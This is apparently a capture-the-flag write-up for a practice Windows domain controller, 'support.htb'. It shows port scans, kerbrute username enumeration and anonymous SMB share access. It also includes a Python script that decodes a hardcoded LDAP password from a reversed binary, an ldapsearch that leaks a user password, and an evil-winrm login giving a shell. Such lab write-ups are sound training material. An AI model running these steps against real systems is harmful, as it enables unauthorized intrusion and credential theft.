# IP
10.10.11.174

## Enumeration
### Rustscan

- Found 19 ports running on the machine.

```console
❯ rustscan -a 10.10.11.174  --ulimit 5000 | tee rustscan.log
❯ cat rustscan.log
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/divu050704/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.11.174:53
Open 10.10.11.174:88
Open 10.10.11.174:135
Open 10.10.11.174:139
Open 10.10.11.174:389
Open 10.10.11.174:445
Open 10.10.11.174:464
Open 10.10.11.174:593
Open 10.10.11.174:636
Open 10.10.11.174:3268
Open 10.10.11.174:3269
Open 10.10.11.174:5985
Open 10.10.11.174:9389
Open 10.10.11.174:49664
Open 10.10.11.174:49668
Open 10.10.11.174:49674
Open 10.10.11.174:49685
Open 10.10.11.174:49703
Open 10.10.11.174:59982
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 09:13 IST
Initiating Ping Scan at 09:13
Scanning 10.10.11.174 [2 ports]
Completed Ping Scan at 09:13, 3.00s elapsed (1 total hosts)
Nmap scan report for 10.10.11.174 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.09 seconds
```

- Started `nmap` scan on all these ports

### Nmap
- Found kerberos running with domain `support.htb`.

```console
❯ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49668,49674,49685,49703,59982  -vvv -Pn 10.10.11.174 | tee nmap.log  -
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-19 11:47 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:47
Completed NSE at 11:47, 0.00s elapsed
Initiating Connect Scan at 11:47
Scanning support.htb (10.10.11.174) [19 ports]
Discovered open port 139/tcp on 10.10.11.174
Discovered open port 445/tcp on 10.10.11.174
Discovered open port 135/tcp on 10.10.11.174
Discovered open port 53/tcp on 10.10.11.174
Discovered open port 59982/tcp on 10.10.11.174
Discovered open port 49685/tcp on 10.10.11.174
Discovered open port 49668/tcp on 10.10.11.174
Discovered open port 49664/tcp on 10.10.11.174
Discovered open port 49703/tcp on 10.10.11.174
Discovered open port 9389/tcp on 10.10.11.174
Discovered open port 88/tcp on 10.10.11.174
Discovered open port 464/tcp on 10.10.11.174
Discovered open port 389/tcp on 10.10.11.174
Discovered open port 5985/tcp on 10.10.11.174
Discovered open port 3268/tcp on 10.10.11.174
Discovered open port 636/tcp on 10.10.11.174
Discovered open port 3269/tcp on 10.10.11.174
Discovered open port 49674/tcp on 10.10.11.174
Discovered open port 593/tcp on 10.10.11.174
Completed Connect Scan at 11:47, 0.17s elapsed (19 total ports)
Initiating Service scan at 11:47
Scanning 19 services on support.htb (10.10.11.174)
Completed Service scan at 11:47, 54.94s elapsed (19 services on 1 host)
NSE: Script scanning 10.10.11.174.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:47
NSE Timing: About 99.96% done; ETC: 11:48 (0:00:00 remaining)
Completed NSE at 11:48, 40.45s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 2.40s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
Nmap scan report for support.htb (10.10.11.174)
Host is up, received user-set (0.086s latency).
Scanned at 2022-11-19 11:47:04 IST for 98s

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2022-11-19 06:17:15Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49685/tcp open  msrpc         syn-ack Microsoft Windows RPC
49703/tcp open  msrpc         syn-ack Microsoft Windows RPC
59982/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 3s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2022-11-19T06:18:06
|_  start_date: N/A
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 16487/tcp): CLEAN (Timeout)
|   Check 2 (port 19493/tcp): CLEAN (Timeout)
|   Check 3 (port 45724/udp): CLEAN (Timeout)
|   Check 4 (port 54541/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:48
Completed NSE at 11:48, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.60 seconds

```

### Samba(enum4linux)
- Tried logging in without username and password with enum4linux, but was unsuccessful
- Tried kerbrute to search for usernames

### Keberos(kerbrute)

- Searched for usernames for kerberos services and found 3 

```console
❯ kerbrute --dc support.htb  userenum -d support.htb  /usr/share/wordlists/rockyou.txt   | tee kerbrute.log


    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 11/19/22 - Ronnie Flathers @ropnop

2022/11/19 09:41:38 >  Using KDC(s):
2022/11/19 09:41:38 >  	support.htb:88

2022/11/19 09:43:34 >  [+] VALID USERNAME:	 administrator@support.htb
2022/11/19 09:43:52 >  [+] VALID USERNAME:	 support@support.htb
2022/11/19 09:43:54 >  [+] VALID USERNAME:	 management@support.htb
```

### Samba(enum4linux `user:management`)
- Tried enumerating samba with enum4linux and user as `management`
- Success, found share `support-tools`, on which we can map and list without password.

```console
NT_STATUS_NO_SUCH_FILE listing \*
//10.10.11.174/IPC$	Mapping: N/A Listing: N/A Writing: N/A
//10.10.11.174/NETLOGON	Mapping: OK Listing: DENIED Writing: N/A
//10.10.11.174/support-tools	Mapping: OK Listing: OK Writing: N/A
//10.10.11.174/SYSVOL	Mapping: OK Listing: DENIED Writing: N/A
```
- Logged in and found many executables, but  `UserInfo.exe.zip` seems to be interesting so downloaded it 

```console
❯ smbclient  \\\\support.htb\\support-tools -U support.htb\\management  -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 22:31:06 2022
  ..                                  D        0  Sat May 28 16:48:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 16:49:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 16:49:55 2022
  putty.exe                           A  1273576  Sat May 28 16:50:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 16:49:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 22:31:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 16:50:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 16:49:43 2022

		4026367 blocks of size 4096. 920006 blocks available
smb: \> mget UserInfo.exe.zip
Get file UserInfo.exe.zip? y
getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (406.3 KiloBytes/sec) (average 406.3 KiloBytes/sec)
```
- Unzip this file and load it `dnSpy` for reverse engineering.

### UserInfo.exe (dnSpy)
- Upload all the files to `dnSpy` and search for protected function under `UserInfo.service`.

![screebshit](https://github.com/divu050704/assets-holder/raw/main/tryhackme-screenshots/Screenshot_20221119_113323.png)

- We will right this piece of code in python format.

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando".encode("UTF-8")

array = base64.b64decode(enc_password)
array2 = ""

for i in range(len(array)):
    array2 += chr(array[i] ^ key[i % len(key)] ^ 223)

print(array2)
```

- Found the bind password 

```console
❯ python3 decoder.py
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

- Did ldapsearch with this password.


### Ldapsearch
- Found a password with the bind password for user `support`: `Ironside47pleasure40Watchful`.

```console
❯ ldapsearch -v -x -b "CN=support,CN=users, DC=support,DC=htb" -H "ldap://support.htb" "(objectclass=*)" -D "support\\ldap" -w "nvEfEK16^1aM4\$e7AclUf8x\$tRWxPWO1%lmz" | tee ldapsearch.log
ldap_initialize( ldap://support.htb:389/??base )
filter: (objectclass=*)
requesting: All userApplication attributes
# extended LDIF
#
# LDAPv3
# base <CN=support,CN=users, DC=support,DC=htb> with scope subtree
# filter: (objectclass=*)
# requesting: ALL
#

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20221119052110.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 140130
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 45794
codePage: 0
countryCode: 0
badPasswordTime: 133133059941407882
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
lastLogonTimestamp: 133133088709376386

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1

```

## Exploitation 

### User Access
- Logged into machine with `evil-winrm` with the credentials
- Got Initial Access

```console
❯ evil-winrm -i support.htb -u support -p "Ironside47pleasure40Watchful"

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\support\Documents>

```
- 
